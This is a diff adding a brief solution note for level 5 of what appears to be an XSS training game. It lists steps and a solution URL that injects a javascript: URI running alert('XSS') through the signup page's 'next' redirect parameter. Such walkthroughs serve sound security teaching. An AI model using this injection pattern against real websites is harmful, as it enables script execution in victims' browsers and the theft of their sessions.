@@ -1,0 +1,7 @@
+Level5: Breaking protocol
+*********************************************************************************
+-First press signup.
+-Replace the vulnerable url with the one from the solution.
+-Press next so the js code gets run.
+
+Solution: http://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")
